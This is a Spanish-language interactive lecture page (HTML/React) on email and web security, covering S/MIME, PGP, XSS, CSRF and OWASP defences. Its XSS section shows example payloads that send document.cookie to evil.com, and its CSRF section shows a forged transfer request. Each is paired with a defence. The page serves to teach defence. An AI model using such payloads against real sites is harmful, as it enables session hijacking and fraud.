@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=1280"/>
+<title>Clase 8.7 – Seguridad en Email y Web: S/MIME, PGP, XSS y CSRF</title>
+<script src="https://unpkg.com/react@18/umd/react.development.js"></script>
+<script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#060a14;color:#e8f0fe;font-family:'Segoe UI',sans-serif;width:1280px;height:720px;overflow:hidden}
+.layout{display:flex;height:720px}
+.sidebar{width:220px;background:#0f1628;border-right:1px solid #1e3a5f;display:flex;flex-direction:column;padding:16px 0}
+.sidebar h2{color:#ef4444;font-size:13px;font-weight:700;padding:0 16px 12px;border-bottom:1px solid #1e3a5f;text-transform:uppercase;letter-spacing:.5px}
+.nav-btn{background:none;border:none;color:#7c8db8;padding:10px 16px;text-align:left;cursor:pointer;font-size:13px;width:100%;transition:all .2s;border-left:3px solid transparent;line-height:1.4}
+.nav-btn:hover{color:#e8f0fe;background:#0a1020}
+.nav-btn.active{color:#ef4444;background:#0a1020;border-left-color:#ef4444;font-weight:600}
+.content{flex:1;padding:32px;overflow-y:auto}
+h1{font-size:22px;font-weight:700;color:#e8f0fe;margin-bottom:6px}
+.subtitle{color:#7c8db8;font-size:14px;margin-bottom:24px}
+.card{background:#0f1628;border:1px solid #1e3a5f;border-radius:10px;padding:20px;margin-bottom:16px}
+.card h3{color:#3b82f6;font-size:15px;font-weight:600;margin-bottom:12px}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{background:#0a1020;color:#3b82f6;padding:8px 10px;text-align:left;font-weight:600}
+td{padding:7px 10px;border-bottom:1px solid #1e3a5f;color:#e8f0fe}
+tr:last-child td{border-bottom:none}
+.mono{font-family:monospace;background:#0a1020;border:1px solid #1e3a5f;border-radius:6px;padding:12px;font-size:12px;line-height:1.8}
+</style>
+</head>
+<body>
+<div id="root"></div>
+<script type="text/babel">
+const {useState}=React;
+const SCENES=[{id:1,label:"S/MIME y PGP"},{id:2,label:"Ataques XSS"},{id:3,label:"CSRF y defensa web"}];
+
+function Scene1(){
+  const [mode,setMode]=useState("smime");
+  return(
+    <div>
+      <h1>Seguridad en Email: S/MIME y PGP</h1>
+      <p className="subtitle">El correo electrónico por defecto no tiene cifrado ni autenticación del cuerpo. S/MIME y PGP añaden estas propiedades de extremo a extremo</p>
+      <div style={{display:"flex",gap:10,marginBottom:16}}>
+        <button onClick={()=>setMode("smime")} style={{background:mode==="smime"?"#3b82f6":"#0a1020",border:"1px solid #1e3a5f",color:mode==="smime"?"#0a1020":"#e8f0fe",borderRadius:6,padding:"6px 20px",cursor:"pointer",fontWeight:600}}>S/MIME</button>
+        <button onClick={()=>setMode("pgp")} style={{background:mode==="pgp"?"#f97316":"#0a1020",border:"1px solid #1e3a5f",color:mode==="pgp"?"#0a1020":"#e8f0fe",borderRadius:6,padding:"6px 20px",cursor:"pointer",fontWeight:600}}>PGP / GPG</button>
+      </div>
+      <div className="grid2">
+        <div>
+          {mode==="smime"?(
+            <div className="card">
+              <h3>S/MIME — Secure/MIME</h3>
+              <p style={{color:"#e8f0fe",fontSize:13,lineHeight:1.7,marginBottom:10}}>S/MIME (RFC 5751) usa certificados X.509 y PKI para cifrar y firmar correos. El receptor necesita la clave pública del emisor (en su certificado).</p>
+              <div style={{display:"flex",flexDirection:"column",gap:6,fontSize:12}}>
+                {[
+                  {n:"Cifrado del mensaje",c:"#3b82f6",d:"Cifra con AES usando una clave de sesión, que a su vez se cifra con la clave pública RSA del destinatario. Solo él puede descifrar."},
+                  {n:"Firma digital",c:"#10b981",d:"Firma con la clave privada del emisor. El receptor verifica con la clave pública (del certificado del emisor)."},
+                  {n:"Certificados S/MIME",c:"#f97316",d:"Emitidos por CAs reconocidas (Comodo, DigiCert). Vinculan la dirección de email a la clave pública."},
+                  {n:"Content-Type MIME",c:"#8b5cf6",d:"application/pkcs7-mime (cifrado), multipart/signed (firma). Compatible con Outlook, Thunderbird, iOS Mail."},
+                ].map(s=>(
+                  <div key={s.n} style={{background:"#0a1020",border:`1px solid ${s.c}44`,borderRadius:5,padding:"7px 10px"}}>
+                    <div style={{color:s.c,fontWeight:600,marginBottom:2}}>{s.n}</div>
+                    <div style={{color:"#7c8db8"}}>{s.d}</div>
+                  </div>
+                ))}
+              </div>
+            </div>
+          ):(
+            <div className="card">
+              <h3>PGP — Pretty Good Privacy (OpenPGP)</h3>
+              <p style={{color:"#e8f0fe",fontSize:13,lineHeight:1.7,marginBottom:10}}>PGP usa una <strong style={{color:"#f97316"}}>Web of Trust</strong> (red de confianza) en lugar de CAs jerárquicas. Los usuarios firman mutuamente sus claves públicas.</p>
+              <div className="mono" style={{marginBottom:10,fontSize:11}}>
+                <div style={{color:"#7c8db8"}}># Generar par de claves</div>
+                <div>gpg --gen-key</div>
+                <div style={{marginTop:6,color:"#7c8db8"}}># Exportar clave pública</div>
+                <div>gpg --export -a "Alice" {">"} alice.pub</div>
+                <div style={{marginTop:6,color:"#7c8db8"}}># Cifrar para Bob</div>
+                <div>gpg -e -r bob@example.com mensaje.txt</div>
+                <div style={{marginTop:6,color:"#7c8db8"}}># Firmar mensaje</div>
+                <div>gpg --clearsign mensaje.txt</div>
+                <div style={{marginTop:6,color:"#7c8db8"}}># Verificar firma</div>
+                <div>gpg --verify mensaje.txt.asc</div>
+              </div>
+              <div style={{background:"#0a1020",border:"1px solid #f9731644",borderRadius:6,padding:8,fontSize:12}}>
+                <div style={{color:"#f97316",fontWeight:600,marginBottom:4}}>Web of Trust vs PKI jerárquica:</div>
+                <div style={{color:"#7c8db8"}}>PGP: usuarios firman claves de otros. Confianza descentralizada, comunitaria. Problemas de arranque ("¿a quién confío yo?").</div>
+              </div>
+            </div>
+          )}
+        </div>
+        <div>
+          <div className="card">
+            <h3>S/MIME vs PGP</h3>
+            <table><tbody>
+              <tr><th>Característica</th><th style={{color:"#3b82f6"}}>S/MIME</th><th style={{color:"#f97316"}}>PGP</th></tr>
+              <tr><td>Confianza</td><td>PKI jerárquica (CA)</td><td>Web of Trust</td></tr>
+              <tr><td>Certificados</td><td>X.509 (CA emitido)</td><td>Claves propias</td></tr>
+              <tr><td>Coste</td><td>Cert de CA (~€/año)</td><td>Gratuito</td></tr>
+              <tr><td>Soporte cliente</td><td>Outlook, iOS, Exchange</td><td>Thunderbird+Enigmail</td></tr>
+              <tr><td>Corporativo</td><td>Muy usado</td><td>Poco usado</td></tr>
+              <tr><td>Técnico</td><td>Más sencillo para usuario</td><td>Requiere conocimiento</td></tr>
+            </tbody></table>
+          </div>
+          <div className="card">
+            <h3>Amenazas en correo electrónico</h3>
+            <div style={{display:"flex",flexDirection:"column",gap:5,fontSize:12}}>
+              {[
+                {n:"Phishing",c:"#ef4444",d:"Email falso que suplanta a una entidad legítima para robar credenciales o instalar malware."},
+                {n:"Spear phishing",c:"#ef4444",d:"Phishing dirigido y personalizado. Usa información específica de la víctima para parecer legítimo."},
+                {n:"Business Email Compromise (BEC)",c:"#f97316",d:"Compromete email corporativo para desviar transferencias bancarias. $43B en pérdidas (FBI, 2023)."},
+                {n:"Email spoofing",c:"#f97316",d:"Forja el campo From: para parecer otro remitente. Mitigado por SPF+DKIM+DMARC."},
+                {n:"Malware adjunto",c:"#8b5cf6",d:"Adjuntos maliciosos: macros Office, PDF exploit, ejecutables. Sandboxing en gateways."},
+              ].map(t=>(
+                <div key={t.n} style={{background:"#0a1020",border:`1px solid ${t.c}44`,borderRadius:5,padding:"6px 10px"}}>
+                  <div style={{color:t.c,fontWeight:600}}>{t.n}</div>
+                  <div style={{color:"#7c8db8",marginTop:2}}>{t.d}</div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function Scene2(){
+  const [xssType,setXssType]=useState("reflected");
+  const xss={
+    reflected:{name:"XSS Reflejado",color:"#ef4444",desc:"El script malicioso se incluye en la URL y el servidor lo refleja en la respuesta. La víctima debe hacer click en el enlace malicioso. No persiste en el servidor.",
+      attack:`URL maliciosa:
+https://victim.com/search?q=<script>
+  fetch('https://evil.com/steal?c='+document.cookie)
+</script>
+
+El servidor responde:
+<p>Resultados para: <script>
+  fetch('https://evil.com/steal?c='+document.cookie)
+</script></p>
+
+→ El script se ejecuta en el browser de la víctima
+→ Cookie de sesión enviada al atacante`,
+      fix:"Escapar output: htmlspecialchars() / encodeURIComponent()"},
+    stored:{name:"XSS Almacenado (Persistent)",color:"#f97316",desc:"El script malicioso se almacena en la base de datos del servidor. Cada vez que un usuario carga la página, el script se ejecuta. Más peligroso.",
+      attack:`En un foro, el atacante publica:
+<script>
+  // Roba cookies de TODOS los que lean el post
+  new Image().src='https://evil.com/?c='+btoa(document.cookie);
+</script>
+
+El servidor guarda esto en la BD.
+Cuando cualquier usuario ve el post → script ejecutado.
+→ Afecta a TODOS los visitantes, no solo a uno.`,
+      fix:"Validar y sanear input antes de almacenar. Nunca confiar en datos de usuario."},
+    dom:{name:"XSS basado en DOM",color:"#8b5cf6",desc:"La vulnerabilidad está en JavaScript del lado cliente, no en el servidor. El DOM se modifica con datos no saneados.",
+      attack:`Código vulnerable:
+document.getElementById('output').innerHTML =
+  location.hash.substring(1);  // ← PELIGROSO
+
+URL de ataque:
+https://victim.com/page#<img src=x onerror="alert(1)">
+
+El servidor no ve el ataque (# no se envía al server).
+El JavaScript lo inserta en el DOM directamente.`,
+      fix:"Usar textContent en lugar de innerHTML. Nunca insertar HTML no saneado en el DOM."},
+  };
+  const x=xss[xssType];
+  return(
+    <div>
+      <h1>Cross-Site Scripting (XSS)</h1>
+      <p className="subtitle">XSS permite a un atacante inyectar scripts maliciosos en páginas web vistas por otros usuarios. Es la vulnerabilidad web más común (OWASP Top 10)</p>
+      <div style={{display:"flex",gap:8,marginBottom:16}}>
+        {Object.keys(xss).map(k=>(
+          <button key={k} onClick={()=>setXssType(k)}
+            style={{background:xssType===k?xss[k].color+"33":"#0a1020",border:`2px solid ${xssType===k?xss[k].color:"#1e3a5f"}`,color:xssType===k?xss[k].color:"#7c8db8",borderRadius:6,padding:"6px 18px",cursor:"pointer",fontWeight:600,fontSize:13}}>
+            {xss[k].name.split(" ")[1]}
+          </button>
+        ))}
+      </div>
+      <div className="grid2">
+        <div>
+          <div className="card" style={{borderColor:x.color+"44"}}>
+            <h3 style={{color:x.color}}>{x.name}</h3>
+            <p style={{color:"#e8f0fe",fontSize:13,lineHeight:1.7,marginBottom:10}}>{x.desc}</p>
+            <pre className="mono" style={{whiteSpace:"pre-wrap",fontSize:10}}>{x.attack}</pre>
+          </div>
+        </div>
+        <div>
+          <div className="card">
+            <h3>Defensa contra XSS</h3>
+            <div style={{display:"flex",flexDirection:"column",gap:7,fontSize:12}}>
+              {[
+                {n:"Output encoding",c:"#10b981",d:"Escapar caracteres especiales en HTML: < → &lt; > → &gt; \" → &quot; ' → &#x27;. Siempre antes de insertar en HTML."},
+                {n:"Content Security Policy (CSP)",c:"#3b82f6",d:"Cabecera HTTP que define qué scripts pueden ejecutarse. 'script-src self' bloquea scripts inline."},
+                {n:"HttpOnly cookies",c:"#f97316",d:"Las cookies con HttpOnly no son accesibles desde JavaScript. Mitiga el robo de sesión vía XSS."},
+                {n:"Sanitización de input",c:"#8b5cf6",d:"Usar librerías (DOMPurify) para limpiar HTML. No confiar nunca en datos externos."},
+                {n:"X-XSS-Protection",c:"#06b6d4",d:"Cabecera legacy para habilitar filtro XSS del navegador. Deprecated en Chrome/Firefox."},
+              ].map(d=>(
+                <div key={d.n} style={{background:"#0a1020",border:`1px solid ${d.c}44`,borderRadius:5,padding:"6px 10px"}}>
+                  <div style={{color:d.c,fontWeight:600}}>{d.n}</div>
+                  <div style={{color:"#7c8db8",marginTop:2}}>{d.d}</div>
+                </div>
+              ))}
+            </div>
+          </div>
+          <div className="card">
+            <h3>Impacto de XSS</h3>
+            <div style={{display:"flex",flexDirection:"column",gap:5,fontSize:12}}>
+              {[
+                {i:"Robo de cookies/sesión",c:"#ef4444"},
+                {i:"Keylogging (captura contraseñas)",c:"#ef4444"},
+                {i:"Redirección a sitios maliciosos",c:"#f97316"},
+                {i:"Defacement (modificar apariencia)",c:"#f97316"},
+                {i:"Drive-by downloads (malware)",c:"#8b5cf6"},
+              ].map(im=>(
+                <div key={im.i} style={{display:"flex",gap:6,padding:"4px 8px",background:"#0a1020",borderLeft:`3px solid ${im.c}`,borderRadius:"0 4px 4px 0"}}>
+                  <span style={{color:im.c}}>▸</span><span style={{color:"#e8f0fe"}}>{im.i}</span>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function Scene3(){
+  const [tab,setTab]=useState("csrf");
+  return(
+    <div>
+      <h1>CSRF y Mejores Prácticas de Seguridad Web</h1>
+      <p className="subtitle">CSRF fuerza a un usuario autenticado a ejecutar acciones no deseadas. Las mejores prácticas combinan múltiples capas de defensa</p>
+      <div style={{display:"flex",gap:8,marginBottom:16}}>
+        {["csrf","owasp","practices"].map(t=>(
+          <button key={t} onClick={()=>setTab(t)}
+            style={{background:tab===t?"#ef4444":"#0a1020",border:`2px solid ${tab===t?"#ef4444":"#1e3a5f"}`,color:tab===t?"white":"#e8f0fe",borderRadius:6,padding:"6px 18px",cursor:"pointer",fontWeight:600,fontSize:13}}>
+            {t==="csrf"?"CSRF":t==="owasp"?"OWASP Top 10":"Buenas prácticas"}
+          </button>
+        ))}
+      </div>
+      <div className="grid2">
+        <div>
+          {tab==="csrf"&&(
+            <div className="card">
+              <h3 style={{color:"#ef4444"}}>CSRF — Cross-Site Request Forgery</h3>
+              <p style={{color:"#e8f0fe",fontSize:13,lineHeight:1.7,marginBottom:10}}>El atacante engaña al usuario autenticado para que su browser envíe peticiones no deseadas al servidor donde tiene sesión activa.</p>
+              <pre className="mono" style={{whiteSpace:"pre-wrap",fontSize:10}}>
+{`Usuario logueado en bank.com
+
+Atacante envía email con link a evil.com:
+<img src="https://bank.com/transfer?
+  to=attacker&amount=1000">
+
+Cuando victim carga evil.com:
+→ Su browser envía GET a bank.com
+→ Con sus cookies de sesión incluidas automáticamente!
+→ El banco ejecuta la transferencia
+
+Defensa principal: CSRF token
+<form>
+  <input type="hidden" name="_csrf"
+         value="token_aleatorio_unico_por_sesion">
+</form>
+→ El atacante no conoce el token secreto`}
+              </pre>
+            </div>
+          )}
+          {tab==="owasp"&&(
+            <div className="card">
+              <h3 style={{color:"#ef4444"}}>OWASP Top 10 — 2021</h3>
+              <div style={{display:"flex",flexDirection:"column",gap:4,fontSize:11}}>
+                {[
+                  {n:"A01 Broken Access Control",c:"#ef4444"},
+                  {n:"A02 Cryptographic Failures",c:"#ef4444"},
+                  {n:"A03 Injection (SQLi, XSS…)",c:"#f97316"},
+                  {n:"A04 Insecure Design",c:"#f97316"},
+                  {n:"A05 Security Misconfiguration",c:"#f59e0b"},
+                  {n:"A06 Vulnerable Components",c:"#f59e0b"},
+                  {n:"A07 Auth Failures",c:"#10b981"},
+                  {n:"A08 Software/Data Integrity",c:"#10b981"},
+                  {n:"A09 Security Logging Failures",c:"#3b82f6"},
+                  {n:"A10 Server-Side Request Forgery",c:"#3b82f6"},
+                ].map((o,i)=>(
+                  <div key={o.n} style={{display:"flex",gap:8,padding:"4px 8px",background:"#0a1020",borderRadius:4}}>
+                    <span style={{color:o.c,fontFamily:"monospace",fontWeight:700,width:30}}>{i+1}.</span>
+                    <span style={{color:"#e8f0fe"}}>{o.n}</span>
+                  </div>
+                ))}
+              </div>
+            </div>
+          )}
+          {tab==="practices"&&(
+            <div className="card">
+              <h3 style={{color:"#10b981"}}>Buenas prácticas de seguridad web</h3>
+              <div style={{display:"flex",flexDirection:"column",gap:5,fontSize:11}}>
+                {[
+                  "Usar HTTPS en todo el sitio (HSTS preload)",
+                  "Actualizar dependencias regularmente (npm audit, OWASP Dependency-Check)",
+                  "Principio de mínimo privilegio en BD (SELECT only cuando sea posible)",
+                  "Prepared statements para prevenir SQL Injection",
+                  "Rate limiting y CAPTCHA en formularios de autenticación",
+                  "Contraseñas hasheadas con bcrypt/argon2 (no MD5 ni SHA-1)",
+                  "MFA (Multi-Factor Authentication) para cuentas privilegiadas",
+                  "Cabeceras de seguridad: CSP, HSTS, X-Frame-Options, X-Content-Type-Options",
+                  "Auditorías de seguridad y pentest periódicos",
+                  "Bug bounty program para reporte responsable de vulnerabilidades",
+                ].map((p,i)=>(
+                  <div key={i} style={{display:"flex",gap:6,padding:"4px 8px",background:"#0a1020",borderRadius:4}}>
+                    <span style={{color:"#10b981",fontWeight:700}}>{i+1}.</span>
+                    <span style={{color:"#e8f0fe"}}>{p}</span>
+                  </div>
+                ))}
+              </div>
+            </div>
+          )}
+        </div>
+        <div>
+          <div className="card">
+            <h3>Defensa CSRF</h3>
+            <div style={{display:"flex",flexDirection:"column",gap:6,fontSize:12}}>
+              {[
+                {n:"CSRF Token (Synchronizer Token)",c:"#10b981",d:"El servidor genera un token aleatorio único por sesión. Se incluye en formularios y se verifica en cada request POST."},
+                {n:"SameSite Cookie",c:"#3b82f6",d:"SameSite=Strict: cookie no se envía en requests cross-site. SameSite=Lax: solo requests de navegación top-level."},
+                {n:"Double Submit Cookie",c:"#f97316",d:"El token se envía tanto en cookie como en formulario. El servidor verifica que ambos coincidan."},
+                {n:"Custom Header",c:"#8b5cf6",d:"AJAX requiere cabecera custom (X-Requested-With). Los requests cross-site no pueden añadir cabeceras custom."},
+                {n:"Origin/Referer validation",c:"#06b6d4",d:"El servidor verifica que Origin/Referer sea el propio dominio. No fiable como única defensa."},
+              ].map(d=>(
+                <div key={d.n} style={{background:"#0a1020",border:`1px solid ${d.c}44`,borderRadius:5,padding:"7px 10px"}}>
+                  <div style={{color:d.c,fontWeight:600,marginBottom:2}}>{d.n}</div>
+                  <div style={{color:"#7c8db8"}}>{d.d}</div>
+                </div>
+              ))}
+            </div>
+          </div>
+          <div className="card">
+            <h3>Resumen del Módulo 8</h3>
+            <div style={{display:"flex",flexDirection:"column",gap:4,fontSize:11,color:"#7c8db8"}}>
+              {[
+                "CIA: Confidencialidad, Integridad, Disponibilidad",
+                "Simétrica: AES-256-GCM (rápida, misma clave)",
+                "Asimétrica: RSA/ECDSA (lenta, par de claves)",
+                "Diffie-Hellman: acuerdo de clave sobre canal inseguro",
+                "Certificados X.509: vinculan clave pública a identidad",
+                "PKI: jerarquía Root CA → Intermediate CA → End-entity",
+                "IPsec: seguridad en capa de red (AH/ESP/IKE)",
+                "TLS 1.3: seguridad en capa de transporte (HTTPS)",
+                "Firewalls: packet filter → stateful → NGFW → WAF",
+                "XSS: inyección de scripts. Defensa: encoding + CSP",
+                "CSRF: requests no deseados. Defensa: tokens + SameSite",
+              ].map((r,i)=>(
+                <div key={i} style={{display:"flex",gap:6,padding:"3px 6px",background:"#0a1020",borderRadius:3}}>
+                  <span style={{color:"#3b82f6",fontWeight:700,width:20}}>{i+1}.</span>
+                  <span>{r}</span>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function App(){
+  const [sc,setSc]=useState(1);
+  return(
+    <div className="layout">
+      <div className="sidebar">
+        <h2>8.7 Seguridad Web</h2>
+        {SCENES.map(s=>(
+          <button key={s.id} className={`nav-btn${sc===s.id?" active":""}`} onClick={()=>setSc(s.id)}>
+            {s.id}. {s.label}
+          </button>
+        ))}
+      </div>
+      <div className="content">
+        {sc===1&&<Scene1/>}
+        {sc===2&&<Scene2/>}
+        {sc===3&&<Scene3/>}
+      </div>
+    </div>
+  );
+}
+
+ReactDOM.createRoot(document.getElementById("root")).render(<App/>);
+</script>
+</body>
+</html>
